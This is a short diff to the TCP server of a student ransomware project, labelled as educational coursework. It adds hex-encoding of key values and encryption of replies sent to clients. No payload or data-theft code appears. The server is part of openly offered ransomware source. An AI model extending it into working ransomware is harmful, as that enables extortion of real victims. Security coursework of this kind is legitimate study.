@@ -1,6 +1,6 @@
 #!/usr/bin/python
 # --------------------------------------------
-
+import binascii
 # Ransomware Project for educational purposes
 # Course : Security integration
 # Bloc : 1
@@ -95,8 +95,8 @@ class server_tcp(object):
         # chaques connexion pour éviter de pouvoir spoof sur une autre connexion
         # tcp avec des keys d'autres connexions...
         sec = security.SecurityLayer()
-        c.send(bytes(sec.showValues(), 'utf-8'))
-        print(sec.showValues())
+        print(str(binascii.hexlify(sec.showValues()), 'utf-8'))
+        c.send(bytes(str(binascii.hexlify(sec.showValues())), 'utf-8'))
         # Todo: Mettre en place le cryptage
         while True:
             data = c.recv(2048).decode()
@@ -110,8 +110,9 @@ class server_tcp(object):
             # On construit une réponse grâce à la méthode gestion message
             rs = str(self.gestion_msg(c, data))
             # @Todo: Build header & send it before msg
+            r = sec.encrypt(bytes(rs.encode('utf-8')))
             # On l'envoie
-            c.send(bytes(str(rs), encoding='utf-8'))
+            c.send(bytes(str(r), encoding='utf-8'))
         # On ferme la connexion du client lors de la fin de connexion
         c.close()
 
